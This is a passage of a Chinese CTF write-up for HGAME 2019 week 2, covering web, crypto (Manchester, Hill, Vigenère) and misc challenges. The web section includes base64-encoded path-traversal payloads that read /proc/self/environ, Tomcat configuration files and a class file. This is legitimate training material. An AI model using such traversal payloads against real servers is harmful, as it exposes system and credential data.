<p>但是不知道flag的路径，试着读了一下，无果。于是找服务文件的路径和配置文件的路径：</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">..&#x2F;..&#x2F;..&#x2F;..&#x2F;proc&#x2F;self&#x2F;environ		Li4vLi4vLi4vLi4vcHJvYy9zZWxmL2Vudmlyb24&#x3D;</span><br></pre></td></tr></table></figure>

<p><img src="https://i.loli.net/2019/02/22/5c6f5d632c82d.png"></p>
<p>之后呢，看看tomcat的配置<code> /usr/local/tomcat/conf/server.xml</code>发现出题人并没有修改默认的web路径，还是在<code>/usr/local/tomcat/webapps/ROOT</code></p>
<p><img src="https://i.loli.net/2019/02/22/5c6f5fe3a8db9.png"></p>
<p>接下来，看一下<code>ROOT/WEB-INF/web.xml</code></p>
<p><img src="https://i.loli.net/2019/02/22/5c6f6047b7575.png"></p>
<p>发现一个<code>mathyouqu的路由</code>：访问<code>mathyouqu-servlet.xml</code></p>
<p><img src="https://i.loli.net/2019/02/22/5c6f621dcded5.png"></p>
<p>但是只有包名<code>hgame.controller</code>没有具体的文件名。</p>
<p>回头试试看有没有报错之类的，因为其使用base64编解码，于是错误的BASE64可能会导致java类报错：</p>
<p><img src="https://i.loli.net/2019/02/22/5c6f63202f93d.png"></p>
<p>得到class文件</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">..&#x2F;..&#x2F;..&#x2F;..&#x2F;usr&#x2F;local&#x2F;tomcat&#x2F;webapps&#x2F;ROOT&#x2F;WEB-INF&#x2F;classes&#x2F;hgame&#x2F;controller&#x2F;MathController.class</span><br><span class="line"></span><br><span class="line">Li4vLi4vLi4vLi4vdXNyL2xvY2FsL3RvbWNhdC93ZWJhcHBzL1JPT1QvV0VCLUlORi9jbGFzc2VzL2hnYW1lL2NvbnRyb2xsZXIvTWF0aENvbnRyb2xsZXIuY2xhc3M&#x3D;</span><br></pre></td></tr></table></figure>

<p>用Jad反编译成java文件（<a target="_blank" rel="noopener" href="https://varaneckas.com/jad/">Jad下载链接</a>）：</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">C:\SecTools\Web渗透\JAD\jad158g.win</span><br><span class="line">λ jad -o -r -s java -d src math2.class</span><br><span class="line">Parsing math2.class... Generating src\hgame\controller\MathController.java</span><br></pre></td></tr></table></figure>

<p>直接看关键代码：</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">public</span> String <span class="title">Flag</span><span class="params">(ModelMap model)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    System.out.println(<span class="string">&quot;This is the last question.&quot;</span>);</span><br><span class="line">    System.out.println(<span class="string">&quot;123852^x % 612799081 = 6181254136845 % 612799081&quot;</span>);</span><br><span class="line">    System.out.println(<span class="string">&quot;The flag is hgame&#123;x&#125;.x is a decimal number.&quot;</span>);</span><br><span class="line">    model.addAttribute(<span class="string">&quot;flag&quot;</span>, <span class="string">&quot;Flag is not here.&quot;</span>);</span><br><span class="line">    <span class="keyword">return</span> <span class="string">&quot;flag&quot;</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>真的是一个数学问题，一个方程</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">123852^x % 612799081 &#x3D; 6181254136845 % 612799081</span><br></pre></td></tr></table></figure>

<p>爆破得解（但是比较耗时）</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line">x = <span class="number">0</span></span><br><span class="line"><span class="keyword">while</span> <span class="literal">True</span>:</span><br><span class="line">	res = pow(<span class="number">123852</span>,x,<span class="number">612799081</span>)</span><br><span class="line">	<span class="keyword">if</span> res == <span class="number">6181254136845</span> % <span class="number">612799081</span>:</span><br><span class="line">		<span class="keyword">print</span> <span class="string">&quot;find: &quot;</span> + str(x)</span><br><span class="line">		<span class="keyword">break</span></span><br><span class="line">	<span class="keyword">print</span> x</span><br><span class="line">	x+=<span class="number">1</span></span><br><span class="line"><span class="comment"># find: 15387368</span></span><br></pre></td></tr></table></figure>



<hr>
<p>因为是第一次做有关Java的题目，也是第一次接触Java反编译，很感谢出题人，下面给出几篇<strong>参考链接</strong>：</p>
<ol>
<li><a target="_blank" rel="noopener" href="https://blog.csdn.net/qq_19714505/article/details/80309968">java的class文件批量反编译成java</a></li>
<li><a target="_blank" rel="noopener" href="https://blog.csdn.net/sinat_26935081/article/details/51283706">Spring MVC工程结构及配置整理</a></li>
<li><a target="_blank" rel="noopener" href="https://www.cnblogs.com/liuhongfeng/p/4177835.html">Windows下如何配置tomcat环境变量</a></li>
</ol>
<h1 id="Crypto"><a href="#Crypto" class="headerlink" title="Crypto"></a>Crypto</h1><h2 id="浪漫的足球圣地"><a href="#浪漫的足球圣地" class="headerlink" title="浪漫的足球圣地"></a>浪漫的足球圣地</h2><blockquote>
<p>描述<br>无<br>URL <a target="_blank" rel="noopener" href="http://plir4axuz.bkt.clouddn.com/hgame2019/orz/enc.txt">http://plir4axuz.bkt.clouddn.com/hgame2019/orz/enc.txt</a></p>
</blockquote>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">966A969596A9965996999565A5A59696A5A6A59A9699A599A596A595A599A569A5A99699A56996A596A696A996A6A5A696A9A595969AA5A69696A5A99696A595A59AA56A96A9A5A9969AA59A9559</span><br></pre></td></tr></table></figure>

<p>曼切斯特编码，改成二进制</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">100101100110101010010110100101011001011010101001100101100101100110010110100110011001010101100101101001011010010110010110100101101010010110100110101001011001101010010110100110011010010110011001101001011001011010100101100101011010010110011001101001010110100110100101101010011001011010011001101001010110100110010110101001011001011010100110100101101010100110010110101001101010010110100110100101101010100110100101100101011001011010011010101001011010011010010110100101101010010110101001100101101001011010100101100101011010010110011010101001010110101010010110101010011010010110101001100101101001101010100101100110101001010101011001</span><br></pre></td></tr></table></figure>

<p>参考<a target="_blank" rel="noopener" href="https://zh.wikipedia.org/wiki/%E6%9B%BC%E5%BD%BB%E6%96%AF%E7%89%B9%E7%BC%96%E7%A0%81">https://zh.wikipedia.org/wiki/%E6%9B%BC%E5%BD%BB%E6%96%AF%E7%89%B9%E7%BC%96%E7%A0%81</a></p>
<p>曼彻斯特编码有两种形式，可以都试一下，本题为<code>01-&gt;1,10-&gt;0</code>给出解密脚本</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="comment">#coding:utf-8 </span></span><br><span class="line"><span class="keyword">print</span> <span class="string">&quot;曼彻斯特解码\n&quot;</span> </span><br><span class="line"><span class="comment">#01对应1  10对应0 </span></span><br><span class="line">r=<span class="string">&#x27;&#x27;</span> </span><br><span class="line">s=<span class="string">&#x27;100101100110101010010110100101011001011010101001100101100101100110010110100110011001010101100101101001011010010110010110100101101010010110100110101001011001101010010110100110011010010110011001101001011001011010100101100101011010010110011001101001010110100110100101101010011001011010011001101001010110100110010110101001011001011010100110100101101010100110010110101001101010010110100110100101101010100110100101100101011001011010011010101001011010011010010110100101101010010110101001100101101001011010100101100101011010010110011010101001010110101010010110101010011010010110101001100101101001101010100101100110101001010101011001&#x27;</span> </span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> xrange(len(s)/<span class="number">2</span>): </span><br><span class="line">    c=s[i* <span class="number">2</span>:i*<span class="number">2</span>+<span class="number">2</span>] </span><br><span class="line">    <span class="keyword">if</span> c==<span class="string">&#x27;01&#x27;</span>:  </span><br><span class="line">        r+= <span class="string">&#x27;1&#x27;</span> </span><br><span class="line">    <span class="keyword">else</span>:  </span><br><span class="line">        r+= <span class="string">&#x27;0&#x27;</span> </span><br><span class="line"><span class="keyword">print</span> <span class="string">&#x27;r--&gt;&#x27;</span> + r + <span class="string">&#x27;\n&#x27;</span></span><br><span class="line">print(hex(int(r, <span class="number">2</span>))[<span class="number">2</span>:<span class="number">-1</span>].decode(<span class="string">&quot;hex&quot;</span>))</span><br></pre></td></tr></table></figure>

<p>flag</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">hgame&#123;3f24e567591e9cbab2a7d2f1f748a1d4&#125;</span><br></pre></td></tr></table></figure>



<h2 id="hill"><a href="#hill" class="headerlink" title="hill"></a>hill</h2><blockquote>
<p>Description<br>hill密码，秘钥是3x3矩阵，flag的密文是TCSHXZTCXAPBDKJVJDOHJEAE，flag中含有BABYSHILL，flag是有意义的英文，最终提交格式: hgame{有意义的英文} hint1: <a target="_blank" rel="noopener" href="https://en.wikipedia.org/wiki/Hill_cipher">https://en.wikipedia.org/wiki/Hill_cipher</a> hint2: 模逆元</p>
</blockquote>
<p>hill密码，已知明文攻击。贴一下官方WP吧</p>
<p>相关链接: </p>
<ul>
<li><p><a target="_blank" rel="noopener" href="https://en.wikipedia.org/wiki/Hill_cipher">https://en.wikipedia.org/wiki/Hill_cipher</a></p>
</li>
<li><p><a target="_blank" rel="noopener" href="http://www.practicalcryptography.com/ciphers/hill-cipher/">http://www.practicalcryptography.com/ciphers/hill-cipher/</a> </p>
</li>
<li><p><a target="_blank" rel="noopener" href="http://www.practicalcryptography.com/cryptanalysis/stochastic-searching/cryptanalysis-hill-cipher/">http://www.practicalcryptography.com/cryptanalysis/stochastic-searching/cryptanalysis-hill-cipher/</a></p>
</li>
</ul>
<p><img src="https://i.loli.net/2019/02/23/5c70c40a72033.png"></p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> numpy <span class="keyword">as</span> np</span><br><span class="line"><span class="keyword">from</span> sympy <span class="keyword">import</span> Matrix</span><br><span class="line"><span class="keyword">import</span> string</span><br><span class="line"><span class="keyword">import</span> crypt</span><br><span class="line">alphabet = string.ascii_uppercase</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">convert2matrix</span>(<span class="params">m, dimension</span>):</span></span><br><span class="line">	<span class="keyword">for</span> index, i <span class="keyword">in</span> enumerate(m):</span><br><span class="line">		values = []</span><br><span class="line">		<span class="keyword">if</span> index % dimension == <span class="number">0</span>:</span><br><span class="line">			<span class="keyword">for</span> j <span class="keyword">in</span> range(<span class="number">0</span>, dimension):</span><br><span class="line">				values.append([alphabet.index(m[index + j])])</span><br><span class="line">			<span class="keyword">if</span> index == <span class="number">0</span>:</span><br><span class="line">				m_mat = np.matrix(values)</span><br><span class="line">			<span class="keyword">else</span>:</span><br><span class="line">				m_mat = np.hstack((m_mat, values))</span><br><span class="line">	<span class="keyword">return</span> m_mat</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">&#x27;__main__&#x27;</span>:</span><br><span class="line">	m = <span class="string">&#x27;BABYSHILL&#x27;</span></span><br><span class="line">	c = <span class="string">&#x27;HXZTCXAPB&#x27;</span></span><br><span class="line">	dimension = <span class="number">3</span></span><br><span class="line">	unknown_c = <span class="string">&#x27;TCSHXZTCXAPBDKJVJDOHJEAE&#x27;</span></span><br><span class="line">	c = convert2matrix(c, dimension)</span><br><span class="line">	c = Matrix(c)</span><br><span class="line">	c_inv = c.inv_mod(<span class="number">26</span>) <span class="comment"># 模逆矩阵，直接调库了，不调库自己实现或者通过numpy的逆矩阵稍加修改可以</span></span><br><span class="line">	c_inv = c_inv.tolist()</span><br><span class="line"></span><br><span class="line">	m = convert2matrix(m, dimension)</span><br><span class="line">	m = np.matrix(m)</span><br><span class="line">	dec_key = m*c_inv</span><br><span class="line">	dec_key %= <span class="number">26</span></span><br><span class="line">	print(dec_key)</span><br><span class="line">	m1 = crypt.hill_crypt(unknown_c,dec_key,dimension) <span class="comment">#这是自己实现的简单的hill加密函数，也可用在线网站加密</span></span><br><span class="line">	print(m1)</span><br></pre></td></tr></table></figure>



<h2 id="Vigener"><a href="#Vigener" class="headerlink" title="Vigener~"></a>Vigener~</h2><blockquote>
<p>Description<br>普通的Vigener<br>URL <a target="_blank" rel="noopener" href="http://plir4axuz.bkt.clouddn.com/hgame2019/orz/ciphertext.txt">http://plir4axuz.bkt.clouddn.com/hgame2019/orz/ciphertext.txt</a></p>
</blockquote>
<p><a target="_blank" rel="noopener" href="https://www.guballa.de/vigenere-solver">维吉尼亚密码解密神站</a></p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">Zbi Namyrwjk wmhzk cw s eknlgv uz ifuxstlata edhnufwlow xwpz vc mkohk s kklmwk uz mflklagnkh Gswyuv uavbijk, huwwv uh xzw ryxlwxm sx s qycogxx. Ml ay u jgjs ij hgrsedhnufwlow wmtynmlmzcsf. Lny gahnyv ak kuwq lu orvwxmxsfj urv asjpwekhx, tmz cx jwycwlwj upd szniehzm xg txyec az zsj lnliw ukhxmjoyw, ozowl wsxhiv az nlw vkmgjavnmgf ry gzalzvw atxiuzozjjshfi. Ests twgvfi zsby xjakx xg asjpwekhx wfilchloir kunyqwk zbel sxy ikkkhxasrfc Namyrwjk wmhzklw. Af kckzlkyr kadnc lzxyi, Xjoyhjaib Oskomoa ogm xzw lcvkl zi tmtrcwz s myrwjgf qwlnih gx jygahnyvafm Pmywtyvw uojlwjy. Nlw Noaifwxy gahnyv osy ivayohedde xikuxcfwv hs Kagbur Tsznmklg Viddgms af ncw gfk nlgmyurv xopi zmtxvwv ghh xalnc-gfk vsgc Ru gaxxu hwd. Yck. Yaupef Tgnxakzu Fwdruwg, tan xzw ywlwek qek dgnij eomellxcfmlkx xg Trumkw jy Zaykhijw oh xzw tcrwln wiflalc sfj ms suwomjwj cxk hxywwfz heew. lfey ay ajqmenycpglmqqjzndhrqwpvhtaniz</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">key: guess</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">The Vigenere ciphe is a method of encrypting alphabetic text by using a series of interwoven Caesar ciphers, based on the letters of a keyword. It is a form of polyalphabetic substitution. The cipher is easy to understand and implement, but it resisted all attempts to break it for three centuries, which earned it the description le chiffre indechiffrable. Many people have tried to implement encryption schemes that are essentially Vigenere ciphers. In eighteen sixty three, Friedrich Kasiski was the first to publish a general method of deciphering Vigenere ciphers. The Vigenere cipher was originally described by Giovan Battista Bellaso in his one thousand five hundred and fifty-one book La cifra del. Sig. Giovan Battista Bellaso, but the scheme was later misattributed to Blaise de Vigenere in the nineth century and so acquired its present name. flag is gfyuytukxariyydfjlplwsxdbzwvqt</span><br></pre></td></tr></table></figure>



<h1 id="Misc"><a href="#Misc" class="headerlink" title="Misc"></a>Misc</h1><h2 id="Are-You-Familiar-with-DNS-Records"><a href="#Are-You-Familiar-with-DNS-Records" class="headerlink" title="Are You Familiar with DNS Records?"></a>Are You Familiar with DNS Records?</h2><blockquote>
<p>Description<br>well, you know, this is a song-fen-ti, have fun! XD<br>然并卵的hint: DNS 有很多种不一样的记录类型，其中一种类型如果没有正确设置就可能被其他邮件服务器拒收，flag 就在此域名的第二条此类型记录里<br>URL <a target="_blank" rel="noopener" href="http://project-a11.club/">http://project-a11.club/</a></p>
</blockquote>
<p><a target="_blank" rel="noopener" href="https://tool.lu/dns/index.html">https://tool.lu/dns/index.html</a>      TXT类型记录</p>
<p><img src="https://i.loli.net/2019/02/23/5c70c0976f969.png"></p>
<h2 id="快到火炉旁找个位置坐坐！"><a href="#快到火炉旁找个位置坐坐！" class="headerlink" title="快到火炉旁找个位置坐坐！"></a>快到火炉旁找个位置坐坐！</h2><blockquote>
<p>Description<br>1.从炉石传说导出的套牌为啥不能用了=。= ,还原它 2.flag为hgame{修复后的代码} 套牌代码： hint:出题人首先对数量做了些事情=。= AAECAf0EBu0FuAju9gLQwQIMigGcAq4DyQOrBMsE5gSYxALaxQKW5AK0/ALSiQOmmAMA<br>URL <a target="_blank" rel="noopener" href="http://example.com/">http://example.com/</a></p>
</blockquote>
<p>参考链接  <a target="_blank" rel="noopener" href="https://zhangshuqiao.org/2018-12/%E7%82%89%E7%9F%B3%E5%8D%A1%E7%BB%84%E4%BB%A3%E7%A0%81%E8%A7%A3%E6%9E%90/">https://zhangshuqiao.org/2018-12/%E7%82%89%E7%9F%B3%E5%8D%A1%E7%BB%84%E4%BB%A3%E7%A0%81%E8%A7%A3%E6%9E%90/</a></p>
<h2 id="找得到我嘛？小火汁"><a href="#找得到我嘛？小火汁" class="headerlink" title="找得到我嘛？小火汁"></a>找得到我嘛？小火汁</h2><blockquote>
<p>Description<br>ε=ε=ε=ε=ε=ε=┌(;￣◇￣)┘<br>hint: Https<br>URL <a target="_blank" rel="noopener" href="http://plir4axuz.bkt.clouddn.com/hgame2019/orz/safe.pcapng">http://plir4axuz.bkt.clouddn.com/hgame2019/orz/safe.pcapng</a></p>
</blockquote>
<p>FTP中找到一个压缩包，拉出来解压后发现是一个<code>secret.log</code></p>
<p><img src="https://i.loli.net/2019/02/23/5c70e36896b4e.png"></p>
<p>带到流量包中，解密<code>https流量</code>：编辑——首选项——Protocols——SSL，加载得到的log。然后导出http对象，发现多出一个<code>1.tar</code>。</p>
<p><img src="https://i.loli.net/2019/02/23/5c70e43e6dcf1.png"></p>
<p>解压得到<code>flag.jpg</code>，winhex打开或者exiftool打开都可以看到flag。</p>
<p><img src="https://i.loli.net/2019/02/23/5c70e1aa3b922.png"></p>
<h2 id="初识二维码"><a href="#初识二维码" class="headerlink" title="初识二维码"></a>初识二维码</h2><blockquote>
<p>Description<br>你知道吗，二维码就算有缺损也能扫出来哦<br>hint:1.DataURI 2.QRcode基本结构<br>URL <a target="_blank" rel="noopener" href="http://plqfgjy5a.bkt.clouddn.com/%E5%88%9D%E8%AF%86%E4%BA%8C%E7%BB%B4%E7%A0%81.zip">http://plqfgjy5a.bkt.clouddn.com/%E5%88%9D%E8%AF%86%E4%BA%8C%E7%BB%B4%E7%A0%81.zip</a></p>
</blockquote>
<p>URI字符串可以转成图片，得到</p>
<p><img src="https://i.loli.net/2019/02/23/5c70ed550a8bb.png"></p>
<p>对比二维码的基本结构，我们可以发现少了定位标志和定时标志：</p>
<p><img src="https://i.loli.net/2019/02/23/5c70edaead8df.png"></p>
<p>题目中缺损二维码尺寸是2626，正常二维码的尺寸是<code>((V-1)*4+21)*((V-1)*4+21)</code>（V=版本号），定位符尺寸固定为7*7,在这个网站<a target="_blank" rel="noopener" href="https://merricx.github.io/qrazybox/%E4%B8%8A%E5%8F%AF%E4%BB%A5%E8%BD%BB%E6%9D%BE%E4%BF%AE%E5%A4%8D%E4%BF%AE%E5%A4%8D%E5%90%8E%E7%9A%84%E4%BA%8C%E7%BB%B4%E7%A0%81%E4%B8%BA">https://merricx.github.io/qrazybox/上可以轻松修复修复后的二维码为</a></p>
<p><img src="https://i.loli.net/2019/02/23/5c70ee701f2f3.png"></p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">hgame&#123;Qu1ck_ReSp0nse_cODe&#125;</span><br></pre></td></tr></table></figure>

</div></article><div class="post-copyright"><div class="post-copyright__author"><span class="post-copyright-meta">文章作者: </span><span class="post-copyright-info"><a href="mailto:v0wldl@163.com">V0WKeep3r</a></span></div><div class="post-copyright__type"><span class="post-copyright-meta">文章链接: </span><span class="post-copyright-info"><a href="/v0w.top/2019/02/10/Hgame2019-week2WP/">v0w.top/2019/02/10/Hgame2019-week2WP/</a></span></div><div class="post-copyright__notice"><span class="post-copyright-meta">版权声明: </span><span class="post-copyright-info">本博客所有文章除特别声明外，均采用 <a target="_blank" rel="noopener" href="https://creativecommons.org/licenses/by-nc-sa/4.0/">CC BY-NC-SA 4.0</a> 许可协议。转载请注明来自 <a href="v0w.top">V0W's Blog</a>！</span></div></div><div class="post-meta__tag-list"><a class="post-meta__tags" href="/tags/php/">php</a><a class="post-meta__tags" href="/tags/%E7%88%AC%E8%99%AB/">爬虫</a></div><div class="post-qr-code"><div class="post-qr-code-item"><img class="post-qr-code__img" src="http://image.v0w.top/Blog/2020-08-28-044057.png"><div class="post-qr-code__desc">支付宝打赏</div></div><div class="post-qr-code-item"><img class="post-qr-code__img" src="http://image.v0w.top/Blog/2020-08-28-044040.png"><div class="post-qr-code__desc">微信打赏</div></div></div><nav id="pagination"><div class="prev-post pull-left"><a href="/2019/02/15/week3-WP/"><i class="fa fa-chevron-left">  </i><span>杭电Hgame2019-week3-WP</span></a></div><div class="next-post pull-right"><a href="/2019/02/01/Hgame2019-week1WP/"><span>杭电Hgame2019-week1-WP</span><i class="fa fa-chevron-right"></i></a></div></nav><div id="vcomment"></div><script src="https://cdn1.lncld.net/static/js/3.0.4/av-min.js"></script><script src="https://cdn.jsdelivr.net/npm/valine/dist/Valine.min.js"></script><script>var notify = 'false' == true ? true : false;
var verify = 'false' == true ? true : false;
var GUEST_INFO = ['nick','mail','link'];
var guest_info = 'nick,mail,link'.split(',').filter(function(item){
  return GUEST_INFO.indexOf(item) > -1
});
guest_info = guest_info.length == 0 ? GUEST_INFO :guest_info;
window.valine = new Valine({
  el:'#vcomment',
  notify:notify,
  verify:verify,
  appId:'xuqLRcah5FaInOgKRdj9JB3V-gzGzoHsz',
  appKey:'8vMPXnFoh7Fih1g29jw4JNxl',
  placeholder:'师傅可以留下你的评论和邮箱，V0W能够通过邮件get并回复哦～',
  avatar:'retro',
  guest_info:guest_info,
  pageSize:'10',
  lang: 'zh-cn'
})</script></div></div><footer class="footer-bg" style="background-image: url(/img/index.jpg)"><div class="layout" id="footer"><div class="copyright">&copy;2018 - 2020 By V0WKeep3r</div><div class="framework-info"><span>驱动 - </span><a target="_blank" rel="noopener" href="http://hexo.io"><span>Hexo</span></a><span class="footer-separator">|</span><span>主题 - </span><a target="_blank" rel="noopener" href="https://github.com/Molunerfinn/hexo-theme-melody"><span>Melody</span></a></div><div class="busuanzi"><script async src="//busuanzi.ibruce.info/busuanzi/2.3/busuanzi.pure.mini.js"></script><span id="busuanzi_container_page_pv"><i class="fa fa-file"></i><span id="busuanzi_value_page_pv"></span><span></span></span></div></div></footer><i class="fa fa-arrow-up" id="go-up" aria-hidden="true"></i><script src="https://cdn.jsdelivr.net/npm/animejs@latest/anime.min.js"></script><script src="https://cdn.jsdelivr.net/npm/jquery@latest/dist/jquery.min.js"></script><script src="https://cdn.jsdelivr.net/npm/@fancyapps/fancybox@latest/dist/jquery.fancybox.min.js"></script><script src="https://cdn.jsdelivr.net/npm/velocity-animate@latest/velocity.min.js"></script><script src="https://cdn.jsdelivr.net/npm/velocity-ui-pack@latest/velocity.ui.min.js"></script><script src="/js/utils.js?version=1.6.1"></script><script src="/js/fancybox.js?version=1.6.1"></script><script src="/js/sidebar.js?version=1.6.1"></script><script src="/js/copy.js?version=1.6.1"></script><script src="/js/fireworks.js?version=1.6.1"></script><script src="/js/transition.js?version=1.6.1"></script><script src="/js/scroll.js?version=1.6.1"></script><script src="/js/head.js?version=1.6.1"></script><script src="/js/search/local-search.js"></script><script>if(/Android|webOS|iPhone|iPod|BlackBerry/i.test(navigator.userAgent)) {
  $('#nav').addClass('is-mobile')
  $('footer').addClass('is-mobile')
}</script><div class="search-dialog" id="local-search"><div class="search-dialog__title" id="local-search-title">本地搜索</div><div id="local-input-panel"><div id="local-search-input"><div class="local-search-box"><input class="local-search-box--input" placeholder="搜索文章"></div></div></div><hr><div id="local-search-results"><div id="local-hits"></div><div id="local-stats"><div class="local-search-stats__hr" id="hr"><span>由</span> <a target="_blank" rel="noopener" href="https://github.com/wzpan/hexo-generator-search" style="color:#49B1F5;">hexo-generator-search</a>
 <span>提供支持</span></div></div></div><span class="search-close-button"><i class="fa fa-times"></i></span></div><div class="search-mask"></div></body></html>